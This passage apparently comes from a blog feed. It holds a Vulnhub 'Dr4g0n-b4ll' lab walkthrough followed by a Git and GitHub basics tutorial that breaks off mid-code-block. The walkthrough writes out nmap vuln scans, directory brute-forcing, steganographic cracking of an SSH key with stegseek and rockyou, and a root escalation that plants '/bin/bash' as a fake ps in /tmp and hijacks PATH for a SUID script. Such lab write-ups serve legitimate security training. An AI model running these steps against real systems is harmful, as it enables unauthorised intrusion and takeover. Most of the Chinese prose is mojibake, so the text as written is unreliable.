title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p>1ã€å¿«é€Ÿç²—ç•¥çš„ç«¯å£æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.65</span><br></pre></td></tr></table></figure><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224135148134.png" alt="image-20240224135148134" style="zoom:150%;" /><p>2ã€è¯¦ç»†ç«¯å£æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT --min-rate 10000 -p- 192.168.31.65</span><br><span class="line">nmap.exe -sU --min-rate 10000 -p- 192.168.31.65</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224135658689.png" alt="image-20240224135658689"></p><p>3ã€è¯¦ç»†æ‰«æå’Œæ¼æ´æ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sV -A -p22,80 192.168.31.65</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224135440463.png" alt="image-20240224135440463"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p22,80 192.168.31.65</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224135500772.png" alt="image-20240224135500772"></p><p>åªå‘ç°äº†ä¸€ä¸ªrobots.txt çš„æ–‡ä»¶</p><h3 id="3ã€web-ç›®å½•æ¢æµ‹"><a href="#3ã€web-ç›®å½•æ¢æµ‹" class="headerlink" title="3ã€web ç›®å½•æ¢æµ‹"></a>3ã€web ç›®å½•æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster.exe dir -u http://192.168.31.65 -w d:\theperson\dirs\dicc.txt -b 404,403 --no-error</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224140201673.png" alt="image-20240224140201673"></p><h3 id="4ã€web-æ¡†æ¶æ¢æµ‹"><a href="#4ã€web-æ¡†æ¶æ¢æµ‹" class="headerlink" title="4ã€web æ¡†æ¶æ¢æµ‹"></a>4ã€web æ¡†æ¶æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.31.65</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224140522211.png" alt="image-20240224140522211"></p><h1 id="ä¸‰ã€è·å–shellç«‹è¶³ç‚¹"><a href="#ä¸‰ã€è·å–shellç«‹è¶³ç‚¹" class="headerlink" title="ä¸‰ã€è·å–shellç«‹è¶³ç‚¹"></a>ä¸‰ã€è·å–shellç«‹è¶³ç‚¹</h1><h3 id="1ã€æŸ¥çœ‹æ•æ„Ÿä¿¡æ¯"><a href="#1ã€æŸ¥çœ‹æ•æ„Ÿä¿¡æ¯" class="headerlink" title="1ã€æŸ¥çœ‹æ•æ„Ÿä¿¡æ¯"></a>1ã€æŸ¥çœ‹æ•æ„Ÿä¿¡æ¯</h3><p>1ã€ä¸»é¡µ</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224140723028.png" alt="image-20240224140723028"></p><p>2ã€robots.txt æ–‡ä»¶</p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224140817155.png" alt="image-20240224140817155" style="zoom:200%;" /><p>è¿›è¡Œbase64è§£ç ï¼š</p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224140957715.png" alt="image-20240224140957715" style="zoom:200%;" /><p>3ã€æºä»£ç </p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224141117019.png" alt="image-20240224141117019"></p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224141448789.png" alt="image-20240224141448789" style="zoom:150%;" /><h3 id="2ã€DRAGON-BALLç›®å½•ä¿¡æ¯"><a href="#2ã€DRAGON-BALLç›®å½•ä¿¡æ¯" class="headerlink" title="2ã€DRAGON BALLç›®å½•ä¿¡æ¯"></a>2ã€DRAGON BALLç›®å½•ä¿¡æ¯</h3><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224142227549.png" alt="image-20240224142227549"></p><p>1ã€secret.txt æ–‡ä»¶</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224142428287.png" alt="image-20240224142428287"></p><p>ä¿å­˜ä¸‹æ¥åšç›®å½•çˆ†ç ´</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224143723348.png" alt="image-20240224143723348"></p><p>å¹¶æ— æ”¶è·</p><p>2ã€Vulnhub ç›®å½•</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224143748924.png" alt="image-20240224143748924"></p><p>3ã€Vulnhub&#x2F;login.htmlï¼šæ˜¯ä¸€ä¸ªè™šå‡çš„ç™»å½•é¡µé¢</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224143820482.png" alt="image-20240224143820482"></p><p>4ã€aj.jpgï¼šä¸€å¼ é»‘å®¢çš„å›¾ç‰‡</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224144139876.png" alt="image-20240224144139876"></p><h3 id="3ã€å›¾ç‰‡ä¿¡æ¯æå–"><a href="#3ã€å›¾ç‰‡ä¿¡æ¯æå–" class="headerlink" title="3ã€å›¾ç‰‡ä¿¡æ¯æå–"></a>3ã€å›¾ç‰‡ä¿¡æ¯æå–</h3><p>æå–å›¾ç‰‡éšå†™ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegseek aj.jpg /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224150532499.png" alt="image-20240224150532499" style="zoom:150%;" /><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224150607293.png" alt="image-20240224150607293"></p><h3 id="4ã€è·å–shell-ç«‹è¶³ç‚¹"><a href="#4ã€è·å–shell-ç«‹è¶³ç‚¹" class="headerlink" title="4ã€è·å–shell ç«‹è¶³ç‚¹"></a>4ã€è·å–shell ç«‹è¶³ç‚¹</h3><p>æ­¤æ—¶æ‹¿åˆ°ä¸€ä¸ªsshå¯†é’¥ï¼Œæ¬ ç¼ºç”¨æˆ·åï¼Œæ­¤å¤„çš„xmen æ˜¯ç”¨æˆ·å</p><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224150858190.png" alt="image-20240224150858190"></p><p>æˆ‘ä»¬ç›´æ¥ç”¨å¯†é’¥è¿›è¡Œç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh xmen@192.168.31.65 -i id_rsa</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224150946067.png" alt="image-20240224150946067"></p><p>æˆåŠŸæ‹¿åˆ°shell</p><h1 id="å››ã€ææƒè‡³root"><a href="#å››ã€ææƒè‡³root" class="headerlink" title="å››ã€ææƒè‡³root"></a>å››ã€ææƒè‡³root</h1><h3 id="1ã€æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶"><a href="#1ã€æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="1ã€æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶"></a>1ã€æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶</h3><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224151439588.png" alt="image-20240224151439588"></p><p>shell æ˜¯ä¸€ä¸ªsuidæƒé™ï¼Œå‘ç°å¯ä»¥æ‰§è¡Œç¯å¢ƒå˜é‡ä¸­çš„ps å‘½ä»¤ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•ç”¨ç¯å¢ƒå˜é‡åŠ«æŒæ¥ææƒ</p><h3 id="2ã€ææƒè‡³root"><a href="#2ã€ææƒè‡³root" class="headerlink" title="2ã€ææƒè‡³root"></a>2ã€ææƒè‡³root</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd ~/script</span><br><span class="line">./script</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Dr4g0n-b4ll/image-20240224151818159.png" alt="image-20240224151818159"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhubç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åŸºç¡€çŸ¥è¯†ã€‘Git å’Œ Github çš„æ·±åº¦è®¤çŸ¥</title>
      <link href="/2024/02/24/Nouns-git/"/>
      <url>/2024/02/24/Nouns-git/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€Gitä»‹ç»"><a href="#ä¸€ã€Gitä»‹ç»" class="headerlink" title="ä¸€ã€Gitä»‹ç»"></a>ä¸€ã€Gitä»‹ç»</h1><p> Git æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå®ƒä¸ä»…ä»…æ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯å·¥å…·ã€‚Git çš„å·¥ä½œæ–¹å¼æ¶‰åŠåˆ°å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯çš„æ¦‚å¿µï¼Œä½†å®ƒçš„æ ¸å¿ƒåŠŸèƒ½å¯ä»¥åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šå®Œæˆï¼Œæ— éœ€ç½‘ç»œè¿æ¥ã€‚ä»¥ä¸‹æ˜¯ Git çš„ä¸€äº›å…³é”®ç‰¹ç‚¹ï¼š</p><ol><li><p><strong>åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶</strong>ï¼š</p><ul><li>Git åœ¨æ¯ä¸ªå¼€å‘è€…çš„æœ¬åœ°è®¡ç®—æœºä¸Šéƒ½æœ‰ä¸€ä¸ªå®Œæ•´çš„ä»£ç åº“å‰¯æœ¬ï¼ŒåŒ…æ‹¬å®Œæ•´çš„å†å²è®°å½•ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥åœ¨æœ¬åœ°è¿›è¡Œå‡ ä¹æ‰€æœ‰çš„ç‰ˆæœ¬æ§åˆ¶æ“ä½œï¼Œå¦‚æäº¤ï¼ˆcommitï¼‰ã€åˆ†æ”¯ï¼ˆbranchï¼‰ã€åˆå¹¶ï¼ˆmergeï¼‰ç­‰ã€‚</li></ul></li><li><p><strong>å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å¼</strong>ï¼š</p><ul><li>å°½ç®¡ Git æ˜¯åˆ†å¸ƒå¼çš„ï¼Œä½†å®ƒé€šå¸¸åœ¨å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å¼ä¸‹ä½¿ç”¨ã€‚å¼€å‘è€…çš„æœ¬åœ°ä»“åº“ï¼ˆå®¢æˆ·ç«¯ï¼‰å¯ä»¥ä¸è¿œç¨‹ä»“åº“ï¼ˆæœåŠ¡å™¨ï¼‰åŒæ­¥ã€‚è¿œç¨‹ä»“åº“é€šå¸¸æ‰˜ç®¡åœ¨æœåŠ¡å™¨ä¸Šï¼Œå¦‚ GitHubã€GitLab æˆ– Giteeã€‚</li></ul></li><li><p><strong>å®¢æˆ·ç«¯å·¥å…·</strong>ï¼š</p><ul><li>Git æä¾›äº†ä¸€ä¸ªå‘½ä»¤è¡Œç•Œé¢ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ‰§è¡Œå„ç§ç‰ˆæœ¬æ§åˆ¶æ“ä½œã€‚æ­¤å¤–ï¼Œè¿˜æœ‰è®¸å¤šå›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆGUIï¼‰å®¢æˆ·ç«¯å·¥å…·ï¼Œå¦‚ GitHub Desktopã€SourceTreeã€GitKraken ç­‰ï¼Œå®ƒä»¬æä¾›äº†æ›´ç›´è§‚çš„æ“ä½œæ–¹å¼ã€‚</li></ul></li><li><p><strong>æœåŠ¡å™¨ç«¯</strong>ï¼š</p><ul><li>æœåŠ¡å™¨ç«¯çš„ Git æœåŠ¡æä¾›äº†è¿œç¨‹ä»“åº“çš„æ‰˜ç®¡ï¼Œå…è®¸å¤šä¸ªå¼€å‘è€…åä½œã€‚æœåŠ¡å™¨ç«¯è¿˜æä¾›äº†ä¸€äº›é¢å¤–çš„åŠŸèƒ½ï¼Œå¦‚æƒé™æ§åˆ¶ã€Web ç•Œé¢è®¿é—®ã€æŒç»­é›†æˆï¼ˆCIï¼‰å’ŒæŒç»­éƒ¨ç½²ï¼ˆCDï¼‰é›†æˆç­‰ã€‚</li></ul></li></ol><p>æ€»ç»“æ¥è¯´ï¼ŒGit æœ¬èº«æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå®ƒåœ¨æœ¬åœ°æä¾›äº†å®Œæ•´çš„ç‰ˆæœ¬æ§åˆ¶åŠŸèƒ½ã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæ”¯æŒå®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å¼ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡å®¢æˆ·ç«¯å·¥å…·ä¸è¿œç¨‹æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚Git æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥åœ¨ä»»ä½•æ”¯æŒ Git çš„å¹³å°ä¸Šä½¿ç”¨ï¼Œå¹¶ä¸”å¯ä»¥åœ¨æ²¡æœ‰ç½‘ç»œè¿æ¥çš„æƒ…å†µä¸‹å·¥ä½œã€‚è¿™ç§æ¨¡å¼ä½¿å¾—å›¢é˜Ÿåä½œå’Œä»£ç å…±äº«å˜å¾—æ›´åŠ å®¹æ˜“ã€‚</p><h1 id="äºŒã€Githubä»‹ç»"><a href="#äºŒã€Githubä»‹ç»" class="headerlink" title="äºŒã€Githubä»‹ç»"></a>äºŒã€Githubä»‹ç»</h1><p>GitHub æ˜¯ä¸€ä¸ªåŸºäº Git çš„åœ¨çº¿ä»£ç æ‰˜ç®¡å¹³å°ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªç½‘ç«™ï¼Œå…è®¸å¼€å‘è€…åˆ†äº«ä»£ç ã€åä½œå’Œè®¨è®ºé¡¹ç›®ã€‚GitHub æä¾›äº†å…è´¹çš„å…¬å…±ä»“åº“ï¼Œä½†ç§æœ‰ä»“åº“ï¼ˆé€‚ç”¨äºä¼ä¸šæˆ–å›¢é˜Ÿå†…éƒ¨é¡¹ç›®ï¼‰æ˜¯æ”¶è´¹çš„ã€‚GitHub è¿˜æä¾›äº†ä¸€ç³»åˆ—çš„ APIï¼Œå…è®¸å¼€å‘è€…å’Œç¬¬ä¸‰æ–¹åº”ç”¨ä¸ GitHub çš„æœåŠ¡è¿›è¡Œäº¤äº’ã€‚</p><p>GitHub çš„å¼ºå¤§åŠŸèƒ½å’Œå¹¿æ³›çš„ç”¨æˆ·åŸºç¡€ä½¿å…¶æˆä¸ºäº†å…¨çƒæœ€å¤§çš„ä»£ç æ‰˜ç®¡å¹³å°å’Œå¼€å‘è€…ç¤¾åŒºä¹‹ä¸€ï¼Œæˆä¸ºå…¨çƒæœ€å¤§çš„å¼€æºé¡¹ç›®æ‰˜ç®¡å¹³å°ï¼Œæ‹¥æœ‰åºå¤§çš„å¼€å‘è€…ç¤¾åŒºã€‚</p><h1 id="ä¸‰ã€Giteeã€GitLab-å’Œ-GitCode"><a href="#ä¸‰ã€Giteeã€GitLab-å’Œ-GitCode" class="headerlink" title="ä¸‰ã€Giteeã€GitLab å’Œ GitCode"></a>ä¸‰ã€Giteeã€GitLab å’Œ GitCode</h1><p>GitHubã€Gitee å’Œ GitLab ä»¥åŠå…¶ä»–å¾ˆå¤šéƒ½æ˜¯åŸºäº Git è¿™ä¸ªç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„ä»£ç æ‰˜ç®¡å¹³å°ã€‚</p><h2 id="1ã€Giteeï¼ˆç äº‘ï¼‰"><a href="#1ã€Giteeï¼ˆç äº‘ï¼‰" class="headerlink" title="1ã€Giteeï¼ˆç äº‘ï¼‰"></a>1ã€Giteeï¼ˆç äº‘ï¼‰</h2><p>Giteeï¼Œä¹Ÿç§°ä¸ºç äº‘ï¼Œæ˜¯ä¸€ä¸ªä¸­å›½çš„ä»£ç æ‰˜ç®¡å¹³å°ï¼ŒåŒæ ·åŸºäº Gitã€‚å®ƒæä¾›äº†ä¸ GitHub ç±»ä¼¼çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬ä»£ç æ‰˜ç®¡ã€é¡¹ç›®ç®¡ç†ç­‰ã€‚Gitee ä¸»è¦æœåŠ¡äºä¸­æ–‡ç¤¾åŒºï¼Œå¯¹äºå›½å†…å¼€å‘è€…æ¥è¯´ï¼Œç”±äºç½‘ç»œåŸå› ï¼Œè®¿é—®é€Ÿåº¦å¯èƒ½æ¯” GitHub æ›´å¿«ã€‚Gitee æä¾›äº†å…è´¹çš„ç§æœ‰ä»“åº“æœåŠ¡ï¼Œé€‚åˆå›½å†…ä¼ä¸šä½¿ç”¨ã€‚</p><h2 id="2ã€GitLab"><a href="#2ã€GitLab" class="headerlink" title="2ã€GitLab"></a>2ã€GitLab</h2><p>GitLab æ˜¯ä¸€ä¸ªç±»ä¼¼äº GitHub çš„å¹³å°ï¼Œå®ƒä¹Ÿæä¾›äº†åŸºäº Git çš„ä»£ç æ‰˜ç®¡æœåŠ¡ï¼Œå¹¶ä¸”å¯ä»¥å…è´¹æ­å»ºç§æœ‰ä»“åº“ã€‚GitLab ä¸ä»…æ”¯æŒä»£ç æ‰˜ç®¡ï¼Œè¿˜æä¾›äº†ä¸€ç³»åˆ—çš„ DevOps å·¥å…·ï¼Œå¦‚ CI&#x2F;CD ç®¡é“ã€ä»£ç å®¡æŸ¥ã€ç›‘æ§ç­‰ã€‚GitLab å¯ä»¥éƒ¨ç½²åœ¨ç§æœ‰æœåŠ¡å™¨ä¸Šï¼Œè¿™å¯¹äºéœ€è¦å†…éƒ¨æ§åˆ¶å’Œå®‰å…¨æ€§çš„ä¼ä¸šæ¥è¯´æ˜¯ä¸€ä¸ªä¼˜åŠ¿ã€‚</p><h2 id="3ã€GitCode"><a href="#3ã€GitCode" class="headerlink" title="3ã€GitCode"></a>3ã€GitCode</h2><p>GitCode æ˜¯ä¸€ä¸ªå¼€æºä»£ç æ‰˜ç®¡å¹³å°ï¼ŒåŸºäºGitå®ç°ï¼Œç±»ä¼¼äºä¸­å›½è¿è¥çš„Giteeã€‚GitCode ç‰¹åˆ«è€ƒè™‘åˆ°äº†ä¸­å›½ç”¨æˆ·çš„ä½¿ç”¨ä¹ æƒ¯ï¼Œæä¾›äº†ä¸€äº›æœ¬åœ°åŒ–çš„åŠŸèƒ½ï¼Œå¦‚ä¸CSDN è´¦å·æ•´åˆï¼Œä¸­æ–‡ç•Œé¢ã€‚æ­¤å¤–ï¼Œè¿˜æä¾›äº†ä¸GitHub çš„åŒæ­¥åŠŸèƒ½ï¼Œå…è®¸ç”¨æˆ·å°†GitHubä¸Šçš„é¡¹ç›®é•œåƒåˆ°GitCodeï¼Œä»¥åŠ å¿«å›½å†…ç”¨æˆ·çš„è®¿é—®ã€‚</p><h1 id="å››ã€gitçš„åŸºæœ¬ä½¿ç”¨"><a href="#å››ã€gitçš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="å››ã€gitçš„åŸºæœ¬ä½¿ç”¨"></a>å››ã€gitçš„åŸºæœ¬ä½¿ç”¨</h1><h2 id="1ã€å®‰è£…"><a href="#1ã€å®‰è£…" class="headerlink" title="1ã€å®‰è£…"></a>1ã€å®‰è£…</h2><p>1ã€linuxç›´æ¥ä½¿ç”¨åŒ…ç®¡ç†å™¨å®‰è£…å³å¯</p><p>2ã€windowséœ€è¦å»å®˜ç½‘ä¸‹è½½å¯¹åº”çš„exeç‰ˆæœ¬å®‰è£…</p><h2 id="2ã€gitä¸­çš„åŸºæœ¬æ¦‚å¿µ"><a href="#2ã€gitä¸­çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="2ã€gitä¸­çš„åŸºæœ¬æ¦‚å¿µ"></a>2ã€gitä¸­çš„åŸºæœ¬æ¦‚å¿µ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gitä¸­åˆ†å‡ ä¸ªåŒºåŸŸ</span><br><span class="line"><span class="number">1</span>ã€æœ¬åœ°å·¥ä½œåŒº</span><br><span class="line">å°±æ˜¯å†™ä»£ç çš„åŒºåŸŸ</span><br><span class="line"><span class="number">2</span>ã€æœ¬åœ°æš‚å­˜åŒº</span><br><span class="line">ä½¿ç”¨git add . å°†æ–‡ä»¶åŠ å…¥æš‚å­˜åŒº</span><br><span class="line"><span class="number">3</span>ã€æœ¬åœ°ç‰ˆæœ¬åº“</span><br><span class="line">ä¹Ÿå°±æ˜¯æœ¬åœ°ä»“åº“</span><br><span class="line">ä½¿ç”¨git commintå°†æš‚å­˜åŒºçš„æ–‡ä»¶é€å…¥æœ¬åœ°ä»“åº“</span><br></pre></td></tr></table></figure><h2 id="3ã€æœ¬åœ°ä»“åº“çš„æäº¤ä½¿ç”¨"><a href="#3ã€æœ¬åœ°ä»“åº“çš„æäº¤ä½¿ç”¨" class="headerlink" title="3ã€æœ¬åœ°ä»“åº“çš„æäº¤ä½¿ç”¨"></a><strong>3ã€æœ¬åœ°ä»“åº“çš„æäº¤ä½¿ç”¨</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1ã€å…ˆå»githubæˆ–gitee åˆ›å»ºä¸€ä¸ªç©ºä»“åº“</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2ã€åˆ›å»ºæœ¬åœ°gitä»“åº“</span></span><br><span class="line">åœ¨ç©ºæ–‡ä»¶å¤¹ï¼šgit init </span><br><span class="line">æˆ–</span><br><span class="line">git <span class="keyword">clone</span> ä¸€ä¸ªå·²æœ‰çš„ä»“åº“</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3ã€é…ç½®git çš„å…¨å±€å˜é‡</span></span><br><span class="line">git config --<span class="keyword">global</span> user.name <span class="string">&quot;ç”¨æˆ·å&quot;</span></span><br><span class="line">git config --<span class="keyword">global</span> user.email <span class="string">&quot;é‚®ç®±&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4ã€gitæäº¤åˆ°æœ¬åœ°æš‚å­˜åŒº</span></span><br><span class="line">git add .</span><br><span class="line">æˆ–æŒ‡å®šæŸä¸ªæ–‡ä»¶</span><br><span class="line">git add README.md</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5ã€gitæäº¤åˆ°æœ¬åœ°ä»“åº“ï¼ˆåŒæ—¶æ·»åŠ ä¸€ä¸ªå¤‡æ³¨ï¼‰</span></span><br><span class="line">git commit -m <span class="string">&quot;æ–°å¢äº†ä¸€ä¸ª1.txtæ–‡ä»¶&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 6ã€æŸ¥çœ‹æœ¬åœ°ä»“åº“çš„çŠ¶æ€</span></span><br><span class="line">git status </span><br><span class="line"><span class="comment">// æŸä¸ªæ–‡ä»¶æœ‰å˜åŒ–ä¼šæ ‡çº¢</span></span><br></pre></td></tr></table></figure><h2 id="4ã€æœ¬åœ°ä»“åº“çš„log-æŸ¥çœ‹"><a href="#4ã€æœ¬åœ°ä»“åº“çš„log-æŸ¥çœ‹" class="headerlink" title="4ã€æœ¬åœ°ä»“åº“çš„log æŸ¥çœ‹"></a>4ã€æœ¬åœ°ä»“åº“çš„log æŸ¥çœ‹</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1ã€åœ¨æœ¬åœ°ä»“åº“çš„æ ¹ç›®å½•æŸ¥çœ‹æäº¤å†å²</span></span><br><span class="line">git log</span><br><span class="line"><span class="comment">// å¯ä»¥åŸºæœ¬çš„çœ‹åˆ°æäº¤äººã€æäº¤æ—¶é—´å’Œæäº¤çš„å¤‡æ³¨ç­‰ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2ã€æŸ¥çœ‹è¯¦ç»†çš„ä¿®æ”¹çš„å…·ä½“æ–‡ä»¶</span></span><br><span class="line">git log --stat</span><br><span class="line"><span class="comment">// å¯ä»¥çœ‹åˆ°å…·ä½“çš„ä¿®æ”¹çš„æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><h2 id="5ã€æœ¬åœ°ä»“åº“çš„ç‰ˆæœ¬å›æº¯"><a href="#5ã€æœ¬åœ°ä»“åº“çš„ç‰ˆæœ¬å›æº¯" class="headerlink" title="5ã€æœ¬åœ°ä»“åº“çš„ç‰ˆæœ¬å›æº¯"></a><strong>5ã€æœ¬åœ°ä»“åº“çš„ç‰ˆæœ¬å›æº¯</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1ã€å…ˆæ‰¾åˆ°å†å²ç‰ˆæœ¬çš„ID</span></span><br><span class="line">git log --stat</span><br><span class="line"><span class="comment">// æ¯ä¸€ä¸ªç‰ˆæœ¬ä¼šå¯¹åº”ä¸€ä¸ªcommit + ID</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2ã€é€šè¿‡commit + ID å°±å¯ä»¥æŸ¥çœ‹è¿™ä¸ªç‰ˆæœ¬çš„ä¿®æ”¹å†…å®¹</span></span><br><span class="line">git diff &lt;commit id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3ã€åªæ˜¯æŸ¥çœ‹ä¿®æ”¹å†…å®¹æ˜¯ä¸å¤Ÿçš„ï¼Œæˆ‘ä»¬å¯ä»¥å›æ»šåˆ°æŒ‡å®šç‰ˆæœ¬</span></span><br><span class="line">git reset --hard &lt;commit id&gt;</span><br><span class="line">æˆ–</span><br><span class="line">git checkout &lt;commit id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4ã€æˆ‘ä»¬å›æ»šåˆ°ä¹‹å‰ç‰ˆæœ¬åï¼Œåˆæƒ³å›æ»šåˆ°ä¹‹åçš„ç‰ˆæœ¬ï¼Œå¦‚ä½•å®ç°ï¼Ÿ</span></span><br><span class="line">git reflog        <span class="comment">// æŸ¥çœ‹æ‰€æœ‰çš„ç‰ˆæœ¬ï¼ŒåŒ…æ‹¬è¢«å¹²æ‰çš„ç‰ˆæœ¬</span></span><br><span class="line">git reset --hard &lt;commit id&gt;  <span class="comment">// å†å›æ»šå›æ¥</span></span><br></pre></td></tr></table></figure><h2 id="6ã€æœ¬åœ°ä»“åº“gitçš„åˆ†æ”¯"><a href="#6ã€æœ¬åœ°ä»“åº“gitçš„åˆ†æ”¯" class="headerlink" title="6ã€æœ¬åœ°ä»“åº“gitçš„åˆ†æ”¯"></a><strong>6ã€æœ¬åœ°ä»“åº“gitçš„åˆ†æ”¯</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">master/mainï¼šä¸€èˆ¬æ˜¯GitHubè‡ªåŠ¨åˆ›å»ºçš„ä¸»åˆ†æ”¯ï¼Œå­˜æ”¾ç»è¿‡æµ‹è¯•çš„ç¨³å®šä»£ç </span><br><span 